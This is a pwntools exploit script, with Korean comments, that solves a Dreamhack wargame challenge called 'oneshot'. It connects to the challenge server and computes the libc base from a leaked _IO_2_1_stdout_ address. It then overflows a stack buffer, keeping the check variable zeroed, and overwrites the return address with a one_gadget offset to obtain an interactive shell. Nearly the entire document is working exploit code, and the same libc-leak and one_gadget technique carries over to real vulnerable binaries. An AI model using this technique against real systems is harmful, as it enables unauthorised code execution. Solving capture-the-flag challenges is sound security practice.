from pwn import *

context.arch = "amd64"

p = remote("host3.dreamhack.games", 22023)
elf = ELF("./oneshot")
libc = ELF("./libc.so.6")

# [1] Leak libc base
p.recvuntil(b'stdout: ')
libc_stdout = int(p.recvline()[:-1], 16) # b'0x..' 형식으로 출력되기 때문에 16진수로 해석 후 int로 변환해줘야함(u64는 b'\x--\x--' 형식에만 사용 가능)
libc_base = libc_stdout - libc.symbols['_IO_2_1_stdout_']

# 아래의 두 stdout으로는 안됨 (readelf -s 로 찾은거)
# libc_base = libc_stdout - libc.symbols['stdout']
# libc_base = libc_stdout - 0x3c5708

# [2] Overwrite return address
# 주석이 안된 2개의 가젯만 main이 return한 후 return address에 갔을 때 조건을 만족함
og = libc_base + 0x45216 # rax == NULL
# og = libc_base + 0x4526a # [rsp+0x30] == NULL
# og = libc_base + 0xf02a4 # [rsp+0x50] == NULL
og = libc_base + 0xf1147 # [rsp+0x70] == NULL

# stack은 주소 방향이 반대이므로, 리틀엔디언 잘 생각하기
payload = b'a' * 0x18       # msg(0x10) + buf(0x8)
payload += b'\x00' * 0x8    # check(0x8)
payload += b'a' * 0x8       # sfp(0x8)
payload += p64(og)[:-2]     # return address(0x8) : [:-2]를 해도 어쩌피 뒤에 b'\x00\x00'은 알아서 짤려서 안해줘도 되긴 함

# 아래처럼 하면 반대 방향으로 들어감
# payload = p64(og)[:-2]
# payload += b'a' * 0x8
# payload += b'\x00' * 0x8
# payload += b'a' * 0x18

p.send(payload)
p.interactive()